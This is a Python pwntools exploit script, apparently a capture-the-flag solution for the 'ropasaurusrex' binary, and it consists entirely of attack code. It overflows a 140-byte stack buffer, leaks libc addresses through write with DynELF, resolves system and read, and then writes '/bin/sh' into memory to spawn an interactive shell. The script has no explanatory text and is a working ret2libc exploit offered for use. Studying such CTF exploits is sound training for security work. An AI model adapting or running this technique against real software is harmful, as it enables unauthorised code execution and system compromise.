#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
p = process('./ropasaurusrex')
elf = ELF('./ropasaurusrex')
start = 0x08048340
write = elf.symbols['write']
buf = 0x08049000

def leak(addr):
	payload = flat(['\x00' * 140, write, start, 1, addr, 8])
	p.sendline(payload)
	data = p.recv()[:8]
	return data

d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
read = d.lookup('read', 'libc')
success('system = ' + hex(system))
success('read = ' + hex(read))
payload = flat([
	'A' * 140, 
	read, 
	system, 
	0, buf, 8
])
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
